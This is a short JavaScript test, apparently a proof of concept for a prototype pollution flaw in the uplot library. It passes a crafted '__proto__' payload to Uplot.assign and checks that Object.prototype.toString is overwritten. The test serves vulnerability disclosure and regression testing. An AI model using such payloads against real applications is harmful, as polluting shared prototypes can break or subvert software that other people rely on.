test("Prototype pollution in uplot", () => {
  var Uplot = require("uplot");

  let payload = { ["__proto__"]: { "toString": "polluted" } };

  expect({}.toString).toBe({}.toString);

  Uplot.assign({}, payload);

  expect({}.toString).toBe("polluted");
})
